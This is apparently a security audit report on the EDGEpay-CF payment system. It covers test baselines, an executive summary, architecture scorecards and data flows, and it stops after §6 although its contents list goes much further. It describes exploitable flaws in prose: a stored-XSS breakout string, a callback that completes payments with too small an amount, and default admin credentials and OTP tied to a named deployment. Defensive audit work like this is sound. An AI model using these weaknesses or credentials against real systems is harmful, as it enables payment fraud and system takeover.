# EDGEpay-CF — Full Architecture, Data Integrity, Stability & Security Audit

**Repository:** `edgepay-cf-clean.zip` (extracted to `/home/z/my-project/audit-work/edgepay-cf/edgepay-cf`)
**Version audited:** 0.3.0 (`package.json`), git `main @ 37da6d6 "Initial commit"`
**Audit date:** 2026-09-01 (Asia/Dhaka)
**Auditor role:** Principal/Staff-level Cloudflare Workers, payments, distributed-systems, database, and application-security engineer
**Audit spec:** Merged requirements of the two supplied audit briefs ("EDGEpay-CF — Full Architecture, Data Integrity, Stability & Security Audit" and "EdgePay-CF — Full Architecture, Data Integrity, Stability, Security & Improvement Audit"), both applied in full.

---

> **How to read this report.**
> Every finding carries a stable ID (`EDGE-P0-001` … `EDGE-P3-012`), severity, confidence, category, affected file(s) with function/line references, an exploit or failure scenario, the existing guard, why the guard is or is not sufficient, impact, exploitability, reproduction, recommended fix, and the regression test that must be added. Verdicts use `PASS / CONDITIONAL / FAIL / UNPROVEN` exactly as required by the audit brief. Secrets discovered during the audit are **redacted** (prefix shown only) per the brief's disclosure rule.
>
> This report treats **code as the single source of truth**. Where the repository's own documentation (`EDGEPAY_AUDIT_REPORT.md`, `TEST_RESULTS.md`, `docs/POSTING-PROTOCOL.md`, `docs/SECURITY.md`) disagrees with the implementation, the implementation wins and the disagreement is recorded as a documentation-drift finding and/or a prior-remediation regression.

---

## Table of Contents

1. [§1 Audit Scope, Method & Environment](#1-audit-scope-method--environment)
2. [§2 Repository Baseline (Phase 0/1 evidence)](#2-repository-baseline)
3. [§3 Executive Summary & Release Verdict](#3-executive-summary--release-verdict)
4. [§4 Architecture Assessment (scorecard B)](#4-architecture-assessment)
5. [§5 System Architecture & Data-Flow Reconstruction](#5-system-architecture--data-flow-reconstruction)
6. [§6 Cloudflare Bindings Inventory & Fail-Mode Analysis](#6-cloudflare-bindings-inventory)
7. [§7 Payment State Machine Reconstruction](#7-payment-state-machine-reconstruction)
8. [§8 Ledger Invariants & Posting Protocol Audit](#8-ledger-invariants--posting-protocol-audit)
9. [§9 P0 File Deep Reviews (the seven mandated files)](#9-p0-file-deep-reviews)
10. [§10 Findings — P0 Critical](#10-findings--p0-critical)
11. [§11 Findings — P1 High](#11-findings--p1-high)
12. [§12 Findings — P2 Medium](#12-findings--p2-medium)
13. [§13 Findings — P3 Low & INFO Observations](#13-findings--p3-low--info)
14. [§14 Security Assessment (scorecard C)](#14-security-assessment)
15. [§15 Stability Assessment (scorecard D)](#15-stability-assessment)
16. [§16 Data Integrity Assessment (scorecard E — the seven questions)](#16-data-integrity-assessment)
17. [§17 Attack / Failure Matrix](#17-attack--failure-matrix)
18. [§18 STRIDE Threat Model](#18-stride-threat-model)
19. [§19 Attack Tree — "Steal or Create Money"](#19-attack-tree--steal-or-create-money)
20. [§20 Financial Failure Tree — "Money becomes incorrect without an attacker"](#20-financial-failure-tree)
21. [§21 The Twenty Non-Negotiable Questions](#21-the-twenty-non-negotiable-questions)
22. [§22 Prior Audit Verification (EDGEPAY_AUDIT_REPORT.md vs code)](#22-prior-audit-verification)
23. [§23 Test Quality Audit & Test Gap Report](#23-test-quality-audit--test-gap-report)
24. [§24 Supply-Chain Audit](#24-supply-chain-audit)
25. [§25 Secrets, Configuration & Deployment Safety](#25-secrets-configuration--deployment-safety)
26. [§26 Data Retention & Privacy](#26-data-retention--privacy)
27. [§27 Observability & Audit Logging](#27-observability--audit-logging)
28. [§28 Architecture / Data-Integrity / Stability Improvement Audits](#28-improvement-audits)
29. [§29 Remediation Roadmap](#29-remediation-roadmap)
30. [§30 Final Verdict](#30-final-verdict)
31. [Appendix A — Finding Index](#appendix-a--finding-index)
32. [Appendix B — Audit Discipline Checklist](#appendix-b--audit-discipline-checklist)
33. [Appendix C — Evidence Transcript (commands & outputs)](#appendix-c--evidence-transcript)

---

# 1. Audit Scope, Method & Environment

## 1.1 Task classification

This is a **code-and-security audit whose deliverable is a single long-form Markdown document**. No application code was modified during the audit (the brief's Phase 0 rule: "Do not modify application code during the initial audit"). No permanent patches were applied; §29 recommends them instead. Temporary audit-side tooling (npm install, vitest runs, grep sweeps) ran inside a disposable extraction directory.

## 1.2 Audit principles applied

The brief's five principles were enforced throughout:

- **Principle 1 — Code is the source of truth.** Every claim in the repository's own audit report, TEST_RESULTS.md, and docs was re-verified against the current tree. Several claims are false today; each is recorded in §22 with a `NOT FIXED`/`REGRESSED`/`PARTIALLY FIXED` status.
- **Principle 2 — Invariant-based reasoning for money.** §8 derives the ledger invariants (A–E) before grading them; every money-moving flow was traced end-to-end (source of funds → destination → serialization boundary → retry boundary → finalization → rollback/reconciliation).
- **Principle 3 — Assume hostile concurrency.** §17 and §8.6 analyze interleavings explicitly (same-key concurrent POSTs, webhook + callback + SMS races, queue redelivery, crash-at-every-boundary).
- **Principle 4 — Distinguish real from apparent guarantees.** The report repeatedly separates "looks atomic" from "is atomic" (e.g. `DB.batch` vs sequential `run()`s in `createIntent`; "deduplicated" vs "deduplicated under concurrency" in the idempotency middleware; "fail closed" vs "fail closed except when `cf` metadata is missing").
- **Principle 5 — Fail-closed for money & auth.** §6 tabulates fail-open/fail-closed behavior for every binding; §14 grades it.

## 1.3 Method

1. **Reconnaissance (Phase 0):** extracted the zip, mapped all directories (`src/` 12 sub-packages, 4 migrations, 22 test files, 8 docs, `scripts/`, `sms-phone-mockup/`, `public/`), read `package.json`, `wrangler.jsonc`, `wrangler.dev.jsonc`, `wrangler.staging.jsonc`, `tsconfig.json`, `vitest.config.ts`, `.dev.vars.example`, `.gitignore`, `db/seeds.sql`.
2. **Baseline (Phase 1):** `npm install`, `npx tsc --noEmit`, `npm run lint`, `npm test`, `npm audit --audit-level=high`, focused vitest runs of the seven security suites named in the brief.
3. **Static sweeps (brief-mandated):** the full grep battery (`innerHTML|outerHTML|eval(|Function(`, `prepare.*${`, `exec(`, `fetch(`, `new URL(`, `Math.random`, `Date.now`, `merchant_id`, secrets regex, `UPDATE.*payment|UPDATE.*ledger|DELETE FROM.*ledger`), each hit manually reviewed — not just counted.
4. **Manual deep review:** complete read (not skim) of all seven P0 files, every middleware, every service, all three queue consumers, both workflows, the cron handler, every controller, all four migrations, the gateway abstraction (`base.ts`, `enabled.ts`, `kit/http.ts`, `kit/form.ts`, `token-cache.ts`), and representative adapters (bKash API, SSLCommerz, Rocket, Stripe, PayPal, the generated-adapter template), plus `sms-phone-mockup/server.js`.
5. **Execution-path tracing:** call graphs reconstructed for payment creation → initiate → callback/webhook/SMS completion → ledger posting → reconciliation; refund creation (both the admin/workflow path and the merchant-API path); mobile pairing → SMS forwarding → corroboration; outbound webhook dispatch → consumer delivery → retry/DLQ.
6. **Prior-remediation verification:** §22 grades every fix claimed in `EDGEPAY_AUDIT_REPORT.md` (§5/§6/§10 there) against current code.
7. **Threat modeling:** STRIDE per component (§18), attack tree (§19), reliability failure tree (§20), and the twenty non-negotiable questions (§21).

## 1.4 Environment

| Item | Value |
|---|---|
| Node | v20+ per `engines` |
| Runtime target | Cloudflare Workers, `compatibility_date 2026-08-28`, `nodejs_compat` |
| Framework | Hono 4.11.x, zod 3.23.x, `@hono/zod-validator` 0.9, decimal.js 10.4, jose 5.9 |
| Toolchain | wrangler 4.127.1, vitest 4.1 + `@cloudflare/vitest-plugin` 1.1.2, typescript 5.6 |
| Test runner reality | Real workerd + miniflare (D1/DO/KV/Queues emulated in-process) |
| LOC audited | ~8,834 lines in `src/` (controllers 2,562; services 2,300; gateways: 123 adapters total, 76 generated from one template; lib 1,452; middleware 1,374; DO 564; queues/workflows/cron ~1,000) |
| Migrations | 0001 initial (768 lines), 0002 CF-native v2, 0003 posting protocol, 0004 payment integrity |

---

# 2. Repository Baseline

All commands executed 2026-09-01 in the extracted tree. Raw transcripts in Appendix C.

## 2.1 Baseline results

| Check | Result | Notes |
|---|---|---|
| `git status` | clean tree, `main`, single commit `37da6d6 Initial commit` | No long git history to mine — but the single commit **does** contain secrets (EDGE-P0-001) |
| `npm install` | OK, 209 packages, 8s | |
| `npm run typecheck` (`tsc --noEmit`) | **0 errors** | Strong: strict mode passes across 8.8k LOC |
| `npm run lint` | **BROKEN — cannot run** | `ESLint couldn't find a eslint.config.(js|mjs|cjs) file` — ESLint 9 requires flat config; the repo ships none. `npm run lint` fails before checking a single file. |
| `npm audit --audit-level=high` | 0 vulnerabilities | Direct deps: hono, zod, decimal.js, jose, @hono/zod-validator, @scalar/hono-api-reference |
| `npm outdated` | wrangler/workers-types minor drift only | Nothing security-relevant |
| Full `npm test` | **21 files: 20 pass + 1 FAILED suite; 212 tests: 207 pass, 5 skip** | The failing suite is `tests/tenant-routing.test.ts > authenticated tenant mismatch (API key and JWT)` — crashes in `beforeAll` at `new JwtService` (`src/lib/jwt.ts:63`) because `env.JWT_SECRET` is undefined in the vitest miniflare bindings (`vitest.config.ts` injects only `ALLOWED_ORIGINS`). The JWT-side tenant-isolation regression tests therefore **do not run**. |
| Focused suites (brief-mandated) | `ledger-do` 14/14, `payment-integrity` + `ledger-consistency` 25/25 total; `access-jwt` + `api-middleware` + `jwt` 34/34 | The security-critical ledger and Access/JWT suites pass; the crash is confined to the tenant-routing JWT portion |

## 2.2 Documentation-baseline drift

- `TEST_RESULTS.md` claims "Test Files 11 passed / 104 tests" (v0.2.3) — the tree has **21 files / 212 tests**; the historical "161/161" claim in `EDGEPAY_AUDIT_REPORT.md` §1 is also stale. Current truth: 207 passing, 5 skipped, 1 suite crashing at setup.
- `EDGEPAY_AUDIT_REPORT.md` references `wrangler.toml`, `env.dev.vars`, `scripts/set-secrets.sh` line numbers, and `tests/lane1-tenant-middleware.test.ts` / `tests/lane3-edge-operations.test.ts` / `tests/lane4-provider.test.ts` — **none of these files exist in the current tree** (config was converted to `wrangler.jsonc`; the lane tests were renamed/replaced). The prior report describes a tree that no longer exists, which is precisely why the brief demands re-verification rather than trust.
- `docs/POSTING-PROTOCOL.md` matches the current `ledger-do.ts` protocol (A–F steps) — verified accurate, including the "never throws / structured failures" contract and the "DO writes commit even on structured failure" caveat.
- `docs/SECURITY.md` describes the API-key shape `op_live_<prefix>_<secret>` and SHA-256 + timing-safe compare — accurate for `src/middleware/auth.ts`.

## 2.3 Repository map (reconstructed)

```
edgepay-cf/
├── src/
│   ├── index.ts                 (295)  Worker entry; middleware order; route mounts; queue/cron dispatch
│   ├── controllers/             api.ts(461) admin-api.ts(403) checkout.ts(761) webhooks.ts(245)
│   │                            mobile.ts(263) install.ts(317) api-reference.ts(113)
│   ├── services/                payment.ts(417) ledger.ts(387) reconciliation.ts(396) refund.ts(160)
│   │                            ledger-audit.ts(151) bootstrap.ts(237) sms-parser.ts(294)
│   │                            sms-corroboration.ts(169) webhook-dispatcher.ts(152) custom-hostnames.ts(191)
│   ├── do/                      ledger-do.ts(564) — ONE LedgerDO per merchant
│   ├── middleware/              auth(182) cloudflare-access(434) csrf(90)* domain(193) idempotency(183)
│   │                            maintenance(84) rate-limit(150) security-headers(78)   *csrf never mounted
│   ├── queues/                  webhook-consumer(168) sms-consumer(164) email-consumer
│   ├── workflows/               refund-reconciliation(284) reconciliation-sweep(119)
│   ├── cron/                    handler.ts(295) — 3 schedules
│   ├── gateways/                base.ts(250) enabled.ts catalog.ts registry-slugs.ts kit/{http,form,token-cache}
│   │                            hand-ported: bkash, nagad, rocket, sslcommerz, stripe, paypal, portwallet,
│   │                            razorpay, shurjopay, aamarpay + generated/ (76 adapters) + planned/
│   └── lib/                     crypto(354) db(167) error(203) hash(191) jwt(124) ledger-chart(44)
│                                logger(87) money(140) observability(74) timing-safe(26) validation(54)
├── migrations/                  0001_initial_schema.sql(768) 0002 0003 0004
├── tests/                       22 files, 212 tests
├── scripts/                     bootstrap.sh set-secrets.sh verify-adversarial.mjs verify-all-roles.mjs
│                                verify-corroboration.mjs  ← CONTAIN LIVE SECRETS (EDGE-P0-001)
├── sms-phone-mockup/server.js   dev companion emulator + OPEN FORWARDING PROXY `/api/forward`
├── public/assets/               checkout CSS/JS (Workers Static Assets, run_worker_first: true)
└── wrangler.jsonc / .dev / .staging
```

---

# 3. Executive Summary & Release Verdict

## 3.1 Overall risk rating

**CRITICAL — NOT PRODUCTION READY.** Release recommendation: **NO-GO.**

## 3.2 Finding counts

| Severity | Count | IDs |
|---|---|---|
| **P0 — Critical** | **7** | EDGE-P0-001 … EDGE-P0-007 |
| **P1 — High** | **10** | EDGE-P1-001 … EDGE-P1-010 |
| **P2 — Medium** | **20** | EDGE-P2-001 … EDGE-P2-020 |
| **P3 — Low** | **12** | EDGE-P3-001 … EDGE-P3-012 |

## 3.3 Can this system safely process money in production today?

**NO.** Money can be created incorrectly (EDGE-P0-007 chain), refunds corrupt the ledger in three distinct ways (EDGE-P0-002, EDGE-P0-003), a live production credential set is committed to the repository (EDGE-P0-001), an attacker-controlled callback can complete an arbitrary-amount intent for a microscopic payment (EDGE-P0-004), default bootstrap credentials yield a root platform key (EDGE-P0-005), and the customer-facing checkout page executes stored JavaScript from merchant-controlled fields with no CSP (EDGE-P0-006).

## 3.4 Top 5 risks (ranked by financial/business impact)

1. **Live API key + JWT signing secret committed in `scripts/verify-*.mjs` (EDGE-P0-001).** Anyone who obtains this archive holds a `'*'`-scoped `op_live_…` key and the HS256 secret for the deployed worker referenced by `wrangler.jsonc` `APP_URL` (`https://edgepay-cf.bm-jonybepary.workers.dev`). Full platform compromise: create merchants, read all tenants, trigger refunds, forge mobile JWTs for any merchant. Rotation is mandatory and immediate.
2. **Refund financial integrity is broken in both code paths (EDGE-P0-002 / EDGE-P0-003).** The workflow path passes an `op_transactions.id` where an `op_ledger_transactions.id` is required — so it reverses an *arbitrary unrelated ledger row* when the numeric ids coincide, or silently reverses *nothing* (the "not found" error string contains "already reversed" and is swallowed as success). The merchant-API path never touches the ledger at all and has no refund ≤ captured or cumulative-refund bound. Books overstate revenue after every refund; double refunds are structurally possible.
3. **Callback completion lacks amount verification and intent binding (EDGE-P0-004).** `handleCallback` ignores `verifyResult.amount` and `verifyResult.trx_id`; the customer-supplied `paymentID`/`val_id` is executed against the gateway and, on success, completes *this* intent at *this* intent's amount. A customer can complete a 100,000 BDT intent using a 10 BDT payment of their own. The SMS and webhook paths use the DB amount, but the redirect-callback path is the primary flow for bKash/SSLCommerz.
4. **Bootstrap default-credential chain (EDGE-P0-005).** A fresh deploy auto-seeds `AdminPass123456!` + pairing OTP `123456` + stores a root API key in KV; `/install/bootstrap-key` exchanges the known email+password for a fresh `'*'` key with no install-lock and (per current code) an install rate limit of **120/min/IP**, not the documented 3/hour.
5. **Checkout stored XSS with no CSP (EDGE-P0-006).** `merchant.color` is interpolated raw into the `<style>` block (`</style><script>` breaks out) and `account_number`/`instructions` are single-quote-injected into `onclick` JavaScript (escapeHtml does not escape `'`); the nonce-CSP middleware is mounted only on `/api/*` and `/webhook/*`, never on the HTML checkout routes. The prior audit's claimed `sanitizeBrandColor` fix is absent from the code.

## 3.5 Top 5 improvements

1. **Bind gateway confirmations to intents and amounts in the service layer, not per adapter:** `completeTransaction` must reject a confirmation whose returned amount ≠ `tx.amount` and whose order/reference id ≠ `tx.trx_id` (fixes EDGE-P0-004 class-wide).
2. **Make refunds a single, bounded, ledger-correct path:** one service (the workflow path), refund amount ≤ remaining captured amount (DB-enforced cumulative check), and reversal keyed by the payment's ledger `tx_id` (`m{merchant}:payment:{intentId}`) — never by a numeric row id from a different table.
3. **Purge and rotate secrets, and move verification scripts to env-fed credentials** (`EDGE_PAY_KEY`/`JWT_SECRET` from the environment, never literals); add a CI secret scanner (gitleaks/trufflehog) plus a pre-commit hook.
4. **Kill the bootstrap default-credential posture:** no hardcoded password/OTP, random secrets surfaced once through the install wizard, install lock backed by D1 (not KV-only), and `/install/bootstrap-key` gated + rate-limited as an auth endpoint (fail-closed 429 after N attempts, lockout on repeated failure).
5. **Harden the checkout page:** context-aware escaping for JS string contexts (JSON-encode the `onclick` args or move to `data-*` + `addEventListener`), `sanitizeBrandColor` `^#[0-9a-fA-F]{6}$`, and a nonce-based CSP on HTML routes with nonces plumbed through the templates.

## 3.6 One-paragraph summary

The **ledger core is the strongest part of this system**: one Durable Object per merchant, `blockConcurrencyWhile` single-writer serialization, strict shape validation (Σdebits = Σcredits, positive safe-integer minor units, ≤ 90M), tx_id dedup, a D1 write-ahead row, an idempotent audit-trail batch, and a reconciliation replay that genuinely converges the *ledger*. If the product were only its `LedgerDO`, the money machinery would be close to production quality. **Everything that feeds or drains the ledger is not**: refunds bypass or corrupt it, callbacks complete payments without amount checks, SMS corroboration has a null-amount bypass, idempotency is not concurrency-safe, outbound webhook SSRF filtering misses IPv6/redirect vectors, checkout renders merchant-controlled JavaScript, default credentials mint root keys, and the repository itself leaks a live credential set. The verdict is therefore **NO-GO**: fix the seven P0s (three are pure correctness bugs with small, testable patches), then re-run this audit's regression battery in §29.5 before any money is processed.

---

# 4. Architecture Assessment

Scorecard per the brief's §42-B. `PASS` / `PASS WITH CONDITIONS` / `FAIL`.

| Dimension | Verdict | Rationale (evidence) |
|---|---|---|
| **Architecture** | **PASS WITH CONDITIONS** | Clean Hono middleware chain with sensible ordering (requestId → logger → bootstrap-check → domain → maintenance → CORS → security headers → Access gate → routes); per-tenant LedgerDO is a genuinely sound primitive; the queue consumer dispatch is awaited (preserving at-least-once semantics — `src/index.ts:252-273`). Conditions: CSRF middleware is dead code (never mounted); `securityHeadersMiddleware` is not applied to HTML surfaces; two divergent refund paths exist (workflow vs inline API); `domainMiddleware` performs a KV read on every request (`system:installed`) with no negative caching. |
| **Data model** | **PASS WITH CONDITIONS** | 30+ tables with FKs, CHECK constraints on statuses, `UNIQUE(merchant_id,key)` on idempotency, `UNIQUE(merchant_id,gateway,event_id)` on webhook events, `tx_id TEXT PRIMARY KEY` on postings. Conditions: `op_api_keys.key_prefix` not UNIQUE (nondeterministic auth on collision); `op_gateways` has no `UNIQUE(merchant_id,slug)` (seed races); money is TEXT (aggregations must stay in JS/DO — they do today, but it is one refactor away from a lexical-SUM bug); no DB-level refund-bounds or state-transition constraints. |
| **Ledger integrity** | **CONDITIONAL** | Invariants A (balance), B (exactly-once), C (no negative balance), E (immutable journal) hold **inside the DO** and are property-tested (`tests/ledger-do.test.ts`, `ledger-consistency.test.ts` — 25/25 pass). Invariant D (ledger-before-completed) holds for payment completion but is **violated for refunds** (EDGE-P0-002/003: wrong/no reversal; no reversal-before-refund-completed ordering). Mirror divergence is possible via the NOT-EXISTS guard dropping legitimately duplicate lines (EDGE-P2-008). |
| **Concurrency** | **CONDITIONAL** | DO single-writer is real and tested; the balance check cannot race (steps B–C precede any write, all inside `blockConcurrencyWhile`). But the idempotency middleware caches responses **after** execution via `waitUntil` (EDGE-P1-001) — concurrent same-key POSTs double-execute; `createIntent` runs sequential, unbatched inserts (EDGE-P1-007); unguarded status UPDATEs allow completed→failed regression (EDGE-P1-006). |
| **Multi-tenancy** | **CONDITIONAL** | SQL predicates consistently include `merchant_id` in api.ts/admin-api.ts/checkout/mobile (verified by reading every `prepare(`); the auth middleware enforces domain-merchant vs key-merchant equality (`auth.ts:104-108,160-164`). Failures: `GET /api/admin/v1/merchants` returns ALL merchants to any admin-scoped merchant key (EDGE-P1-005); `POST /merchants` lets any merchant admin provision tenants and harvest their root keys; `notifications/acknowledgements` updates by bare id list with no tenant predicate (EDGE-P3-004); webhook merchant resolution on the master domain picks the platform merchant by `ORDER BY m.is_platform DESC` (EDGE-P2-004). |
| **Async reliability** | **FAIL** | Queue consumers are individually careful (15s AbortController, 410/422 terminal, retry with bounded attempts, DLQ configured for all three queues), but: outbound webhook delivery has **no idempotency/delivery id** (receivers cannot dedup), retry delay never escalates (`webhook.attempt` is constant per message), there is no outbox (crash between D1 commit and `queue.send` loses the merchant webhook — EDGE-P2-007), the SMS consumer re-persists duplicate rows on redelivery (benign but noisy), and `processPendingSmsVerifications` re-enqueues the same pending SMS every 5 minutes, creating a persistent duplicate-processing loop. |
| **Gateway architecture** | **PASS WITH CONDITIONS** | `ENABLED_GATEWAYS` fail-closed parser with alias mapping and memoization is genuinely good (unknown-only list ⇒ zero gateways; a disabled webhook is indistinguishable from unknown — no inventory leak); `gwFetch` enforces 15s timeouts and truncates error text; generated adapters default `verifyWebhook → false` and `refund → unsupported` (fail-closed). Conditions: **no adapter-level amount/intent binding is centralized** (verify results are trusted by the service layer — EDGE-P0-004); the bkash token cache is keyed on `app_key` in KV; `secretToBytes`'s base64 heuristic can silently reinterpret raw secrets (EDGE-P3-008). |
| **Observability** | **CONDITIONAL** | Structured JSON logs everywhere, `requestId` before logger, a `page()` contract with level=page for drift/stuck-refund/break-glass, Analytics Engine datapoints, `op_reconciliation_runs` audit rows, a webhook-lag metric. Gaps: the ANALYTICS binding is commented out in wrangler.jsonc (all metric() calls are silent no-ops by default); no dashboards/alerts are wired; the `payload_hash` column stores the literal string `'system'` (EDGE-P3-009); the merchant-facing "where is my payment stuck" question is not answerable from any single query (payment-row status is never healed by reconciliation — EDGE-P1-006/P2). |
| **Deployment / migrations** | **CONDITIONAL** | `npm run deploy` applies migrations before `wrangler deploy` (correct ordering); migrations are additive (ALTER ADD COLUMN, CREATE INDEX IF NOT EXISTS) → expand-compatible, rollback-safe to old code. Gaps: per-env configs embed **placeholder ids** (dev `00000000-…-0001`, staging `…-0002`) that must be replaced before those envs deploy (documented in the prior report, still true); `ENABLED_GATEWAYS` unset = **all 123 gateways enabled** (fail-open default, EDGE-P2-016); no `validate:production-config` gate. |

---

# 5. System Architecture & Data-Flow Reconstruction

## 5.1 Request path (reconstructed from `src/index.ts`)

```
Incoming HTTP (Cloudflare edge)
  ↓ run_worker_first=true ⇒ Worker sees EVERY path; /assets/* delegated to ASSETS binding (index.ts:223-225)
requestId()                        index.ts:77   — X-Request-Id generated
logger()                           index.ts:78   — access logs carry the request id
bootstrap-check middleware         index.ts:83-108 — KV system:bootstrapped; if absent, waitUntil(ensureSystemBootstrapped)
  ↳ /install* skips bootstrap      (install wizard owns first-run)
domainMiddleware                   index.ts:109 — Host → merchant resolution (KV 5m cache → D1)
  ↳ master domain (APP_DOMAIN/localhost/127.0.0.1) ⇒ merchantId=null (admin territory)
  ↳ /install, /assets/*, /storage/*, /favicon.ico bypass resolution  (domain.ts:72-80)
  ↳ unknown host ⇒ 404; pending DNS ⇒ 503
  ↳ domain type 'checkout' ⇒ only /checkout|/invoice|/pay|/webhook allowed; /admin hard-404
  ↳ domain type 'api' ⇒ only /api/* allowed
maintenanceMiddleware              index.ts:110 — KV system:maintenance ⇒ 503 (bypass: /install, health, /admin/maintenance, favicon)
prettyJSON (dev only)              index.ts:114-119
secureHeaders (builtin)            index.ts:125-128 — X-Frame-Options DENY, Referrer-Policy
CORS /api/*                        index.ts:136-149 — ALLOWED_ORIGINS allowlist, credentials:false, fail-closed ('' origin)
securityHeadersMiddleware          index.ts:160-161 — nonce-CSP mounted ONLY on /api/* and /webhook/*
accessAuthMiddleware /api/admin/*  index.ts:176 — Cloudflare Access JWT (ES256/RS256, JWKS) OR op_live admin key OR break-glass
perIpRateLimit('install') /install* index.ts:185 — KV counter (config says 120/60s, see EDGE-P2-002)
route mounts:
  /install            installRoutes        (wizard + bootstrap-key)
  /api/v1/health      health (no auth)     index.ts:189-204
  /api/v1             apiRoutes            use: requireBearerApiAuth(['read','write','admin']) THEN rateLimitMiddleware (per key)
  /api/mobile/v1      mobileRoutes         use: requireJwtAuth() (after unauthenticated /pair,/devices,/refresh endpoints)
  /api/admin/v1       adminApiRoutes       use: requireBearerApiAuth(['admin']) THEN rateLimitMiddleware
  /api                apiReferenceRoutes   (OpenAPI + Scalar, own CSP)
  /checkout,/invoice,/pay checkoutRoutes   (PUBLIC, token-addressed; NO rate limit; NO CSP)
  /webhook            webhookRoutes        (gateway callbacks; see EDGE-P1-003)
/assets/*            ASSETS.fetch          index.ts:223-225
onError/notFound                     index.ts:234-235 — lib/error.ts JSON envelope; internals hidden in production
```

**Middleware-ordering verdict:** the ordering is sound — domain resolution precedes auth; auth precedes rate limiting (per-key counters); the Access gate precedes the admin bearer layer; idempotency sits inside route stacks after auth (so the merchant id is known). No route bypasses auth except the deliberately public ones. Two structural exceptions: **CSRF middleware is never mounted** (EDGE-P2-001) and **HTML routes get no CSP** (EDGE-P0-006).

## 5.2 Async path

```
Payment completion (three entry points converge on ONE idempotent sink):
  (a) GET /checkout/{token}/callback   → PaymentService.handleCallback → adapter.verify(provider params)
  (b) POST /webhook/{slug}             → signature verify → event dedup → extractTransactionId → completeTransaction
  (c) SMS queue consumer               → parse → corroborate → completeTransaction
                                        │
                                        ▼
  PaymentService.completeTransaction   payment.ts:349-416
    1. await postPaymentLedgerEntry    ledger.ts:345-387  (idempotency_key = m{merchant}:payment:{intentId})
         → LedgerService.post → getLedgerDO(idFromName('merchant-{id}')).postTransaction
              DO: A shape → B dedup(tx_id) → C balance guard → D D1 pending row
                  → E journal+balances (commit) → F D1 audit trail + pending→posted
    2. D1 batch: op_transactions.status='completed' + op_payment_intents.status='completed'
    3. WebhookDispatcher.dispatch → WEBHOOK_QUEUE.sendBatch (per subscribed endpoint)
                                        │
                                        ▼
  webhook-out consumer                 webhook-consumer.ts:26-88
    SSRF check → HMAC-SHA256 sign → fetch(15s AbortController) → 2xx:ack / 410,422:ack / else retry 60→300→1800
    max_retries=3 → webhook-out-dlq

Refund path A (admin/workflow):
  POST /api/admin/v1/refunds → RefundService.createRefund
    → adapter.refund (best effort) → op_refunds(pending) → REFUND_WORKFLOW.create('refund-{id}')
    → RefundReconciliationWorkflow: poll gateway ≤52 attempts (~24h)
    → finalizeRefund: ledger.reverse(refund.transaction_id)  ← WRONG ID SPACE (EDGE-P0-002)
    → dispatch refund.completed webhook → op_refunds.status='completed'

Refund path B (merchant API):
  POST /api/v1/refunds → inline handler → adapter.refund → INSERT op_refunds(status='completed')
    → NO ledger reversal, NO workflow, NO bounds  (EDGE-P0-003)

SMS path:
  POST /api/mobile/v1/sms (JWT from pairing) → SMS_QUEUE → sms-consumer
    → INSERT op_sms_data → parse (regex templates → heuristic → Workers AI)
    → corroborate (exact amount + customer-submitted TrxID + gateway family) → confirm → completeTransaction

Cron:
  */5min  expire pending intents (pending/processing → expired) + re-enqueue pending SMS
  hourly  exchange rates + domain re-verify + reconcilePendingPostings (grace 30s, limit 200)
  daily   triggerDailySweep → ReconciliationSweepWorkflow (replay + verifyAllMerchants + sweepStuckRefunds + run audit row)

DO alarms: LedgerDO.snapshotBalances → op_ledger_balance_snapshots (idempotent per day)
```

## 5.3 Trust boundaries

```text
┌──────────────────────────────────────────────────────────────────────────────┐
│ UNTRUSTED                                                                    │
│  customer browser (checkout token holder)   gateway callbacks   attackers    │
└──────┬─────────────────────────┬───────────────────────┬────────────────────┘
       │ token-addressed HTML/JSON│ signed webhooks        │ Host/JWT/API-key probes
┌──────▼─────────────────────────▼───────────────────────▼────────────────────┐
│ SEMI-TRUSTED: merchant API keys (hashed, scoped), mobile JWTs (HS256),      │
│ paired devices (SMS injection authority!), merchant-controlled fields       │
│ (brand color, gateway account_number/instructions, SMS regex templates,     │
│ webhook URLs)                                                               │
└──────┬───────────────────────────────────────────────────────────────────────┘
       │
┌──────▼───────────────────────────────────────────────────────────────────────┐
│ TRUSTED: Cloudflare edge (CF-Connecting-IP, cf.country, Access JWT),          │
│ LedgerDO (single writer per merchant), D1, KV, Queues, Workflows              │
└───────────────────────────────────────────────────────────────────────────────┘
```

The single most important architectural observation: **the paired mobile device sits on the "semi-trusted" line but exercises full payment-completion authority.** Anyone holding a paired-device JWT (OTP brute-force, default OTP, or the leaked JWT secret) can inject SMS evidence that money arrived, and the corroboration layer will confirm it. Combined with EDGE-P0-007's amount bypass and the default OTP, this is a complete money-creation chain (see §19 attack tree, branch A3).

---

# 6. Cloudflare Bindings Inventory

From `wrangler.jsonc` (production), cross-checked against `src/types/env.ts` and every call site. The "missing/failed ⇒" column answers the brief's Phase 3 question per binding.

| Binding | Type | Producer / Consumer | Missing / failed ⇒ | Financial risk |
|---|---|---|---|---|
| `DB` | D1 (`edgepay-cf`) | all controllers/services, LedgerDO steps D/F, consumers | runtime exceptions (500s) — **fail closed** | Critical: all money state |
| `KV` | namespace | domain cache, maintenance flag, bootstrap flags, install lock, bkash token cache, `system:root_api_key`, per-IP rate counters | domain resolution falls back to D1 per request; maintenance flag unread ⇒ maintenance OFF (**fail open**); bootstrap re-runs; **root key stored here in plaintext** | High |
| `LEDGER_DO` | Durable Object (SQLite, per-merchant `merchant-{id}`) | LedgerService only | posting fails ⇒ `PostingValidationError(INTERNAL)` thrown worker-side; payment not completed (**fail closed**); reconciliation replays | Critical |
| `R2` | bucket `edgepay-uploads` | **unwired (no code path)** | none | None (capability reserve) |
| `WEBHOOK_QUEUE` + `webhook-out-dlq` | Queue (producer: dispatcher; consumer: webhook-consumer) | payment/refund completion | `sendBatch` throw ⇒ completeTransaction throws **after** ledger+D1 commit ⇒ payment completed but merchant never notified (no outbox) — silent loss of notification (EDGE-P2-007) | Medium |
| `EMAIL_QUEUE`/`SMS_QUEUE` + DLQs | Queues | mobile SMS forwarding; admin retry | `SMS_QUEUE.send` throw ⇒ 500 to device; device retries | Medium |
| `REFUND_WORKFLOW` | Workflow `refund-reconciliation` | RefundService, sweep | create throw (non-duplicate) ⇒ refund creation 500s (**fail closed**) | High |
| `SWEEP_WORKFLOW` | Workflow `reconciliation-sweep` | daily cron + manual ops | duplicate-id swallow; throw ⇒ cron logs error, retried next day | Medium |
| `RATE_LIMIT_READ/WRITE` | Ratelimit bindings 1001/1002 | rateLimitMiddleware per API-key | **absent ⇒ ALLOW + metric** (`rate-limit.ts:75-80`) — documented fail-open; acceptable for reads, questionable for write endpoints (EDGE-P2-005) | Medium |
